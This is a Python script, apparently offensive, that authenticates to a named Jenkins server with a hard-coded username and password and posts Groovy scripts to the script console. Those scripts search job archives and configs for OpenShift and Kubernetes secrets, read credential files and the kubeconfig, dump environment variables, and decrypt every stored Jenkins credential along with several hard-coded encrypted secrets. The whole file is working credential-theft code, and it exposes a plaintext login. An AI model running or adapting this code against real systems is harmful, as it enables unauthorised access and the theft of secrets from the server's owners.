import requests, urllib3
urllib3.disable_warnings()

JENKINS = "https://jenkins-ng.dev.claroshop.com"
USER = "eduardo.cruz"
PASS = "xwMyIxfkZZaDNkFg"

s = requests.Session()
s.auth = (USER, PASS)
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"

crumb_r = s.get(f"{JENKINS}/crumbIssuer/api/json", timeout=30)
crumb_r.raise_for_status()
crumb = crumb_r.json()
s.headers[crumb["crumbRequestField"]] = crumb["crumb"]
print("[+] Crumb OK")

SCRIPTS = [
    ("1. Find YML with OCP/K8s keywords", '''
def r = ["bash","-c","find /var/jenkins_home/jobs -path '*/archive*' -name '*.yml' 2>/dev/null | xargs grep -ilE 'openshift|kubernetes|apiVersion|secret|configMap' 2>/dev/null | head -20"].execute().text
println r
'''),
    ("2. config.xml with OC/deploy commands", '''
def r = ["bash","-c","find /var/jenkins_home/jobs -name 'config.xml' 2>/dev/null | xargs grep -lE 'openshift|oc deploy|oc rollout|oc process|oc apply|amxnova' 2>/dev/null | head -15"].execute().text
println r
'''),
    ("3. Find deployment/secret/configmap YMLs", '''
def r = ["bash","-c","find /var/jenkins_home/jobs -path '*/archive*' -type f 2>/dev/null | grep -iE 'deployment.*yml|secret.*yml|configmap.*yml|dc.*yml' | head -20"].execute().text
println r
'''),
    ("4. Read YMLs with Secret/ConfigMap/password", '''
def cmd = "find /var/jenkins_home/jobs -path '*/archive*' -name '*.yml' 2>/dev/null | xargs grep -ilE 'kind.*Secret|kind.*ConfigMap|password|token|apikey|db_|DB_|jdbc|mongo|redis' 2>/dev/null | head -8"
def files = ["bash","-c",cmd].execute().text.trim().split("\\n")
def out = new StringBuilder()
files.each { f ->
    if (f) {
        out.append("=== ${f} ===\\n")
        try { out.append(new File(f).text.take(4000)) } catch(e) { out.append("ERR: ${e}") }
        out.append("\\n\\n")
    }
}
println out
'''),
    ("5. Grep OC/OCP lines from config.xml", '''
def cmd = "find /var/jenkins_home/jobs -name 'config.xml' 2>/dev/null | xargs grep -lE 'openshift|amxnova|oc |deploy' 2>/dev/null | head -8"
def files = ["bash","-c",cmd].execute().text.trim().split("\\n")
def out = new StringBuilder()
files.each { f ->
    if (f) {
        out.append("=== ${f} ===\\n")
        try {
            new File(f).text.split("\\n").each { line ->
                if (line =~ /(?i)(openshift|amxnova|oc |oc_|deploy|secret|token|password|credential|rollout|configMap|apiVersion|IMAGE|registry)/) {
                    out.append(line.trim() + "\\n")
                }
            }
        } catch(e) { out.append("ERR: ${e}") }
        out.append("\\n")
    }
}
println out
'''),
    ("6. Decrypt ALL Jenkins stored credentials", '''
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*
import org.jenkinsci.plugins.plaincredentials.*
import hudson.util.Secret

def out = new StringBuilder()
def creds = CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardCredentials.class,
    jenkins.model.Jenkins.instance, null, null
)
creds.each { c ->
    out.append("--- ID: ${c.id} | Type: ${c.class.simpleName} ---\\n")
    out.append("  Description: ${c.description}\\n")
    if (c instanceof UsernamePasswordCredentialsImpl) {
        out.append("  Username: ${c.username}\\n")
        out.append("  Password: ${c.password}\\n")
    }
    if (c.respondsTo('getSecret')) {
        out.append("  Secret: ${c.getSecret()}\\n")
    }
    if (c.respondsTo('getPrivateKey')) {
        out.append("  PrivateKey: ${c.getPrivateKey().take(200)}...\\n")
    }
    if (c.respondsTo('getToken')) {
        out.append("  Token: ${c.getToken()}\\n")
    }
    out.append("\\n")
}
println out
'''),
    ("7. Env vars and OCP-related global config", '''
def out = new StringBuilder()
out.append("=== Global Env Vars ===\\n")
jenkins.model.Jenkins.instance.globalNodeProperties.each { p ->
    if (p instanceof hudson.slaves.EnvironmentVariablesNodeProperty) {
        p.envVars.each { k, v -> out.append("  ${k}=${v}\\n") }
    }
}
out.append("\\n=== OC/kubectl in PATH ===\\n")
out.append(["bash","-c","which oc kubectl 2>&1; oc version 2>&1; kubectl version --client 2>&1"].execute().text)
out.append("\\n=== kubeconfig / .kube ===\\n")
out.append(["bash","-c","ls -la /var/jenkins_home/.kube/ 2>/dev/null; cat /var/jenkins_home/.kube/config 2>/dev/null | head -60"].execute().text)
out.append("\\n=== OCP token files ===\\n")
out.append(["bash","-c","find /var/jenkins_home -maxdepth 3 -name '.oc*' -o -name 'oc_token*' -o -name 'kubeconfig*' 2>/dev/null | head -10"].execute().text)
println out
'''),
    ("8. Full credentials.xml + Secret decrypt test", '''
def out = new StringBuilder()
out.append("=== hudson.util.Secret decrypt test ===\\n")
def encrypted = [
    "jenkis": "{AQAAABAAAAAgVmnxwyIQaK07YEfmA/b02ZLH7I1dRafFZnywRTRL2A1/aBnVO+3L+NbFwMLg7hHU}",
    "cs-dev-gitlab-jenkins": "{AQAAABAAAAAgd7Hzy3sn+4iZTRUjmJ7qTJcut7gjLBSYv7aPYaa1uDdhia4TUUZwpPj2QZ13i4pb}",
    "nexus": "{AQAAABAAAAAQKNPBm/vYHIaQNthMZalG2NEdWNgIpXoYFucFuUxQof4=}"
]
encrypted.each { id, enc ->
    try {
        def secret = hudson.util.Secret.fromString(enc)
        out.append("  ${id}: ${secret.getPlainText()}\\n")
    } catch(e) {
        out.append("  ${id}: DECRYPT_ERR: ${e.message}\\n")
    }
}
println out
'''),
]

for label, script in SCRIPTS:
    print(f"\n{'='*80}")
    print(f"[*] {label}")
    print('='*80)
    try:
        resp = s.post(f"{JENKINS}/scriptText", data={"script": script}, timeout=120)
        print(f"[+] {resp.status_code} | {len(resp.text)} bytes")
        out = resp.text
        if "Exception" in out and len(out) > 2000:
            lines = out.split('\n')
            print('\n'.join(lines[:5]))
            print(f"  ... ({len(lines)} lines of stacktrace)")
        else:
            print(out[:8000])
    except Exception as e:
        print(f"[-] ERROR: {e}")
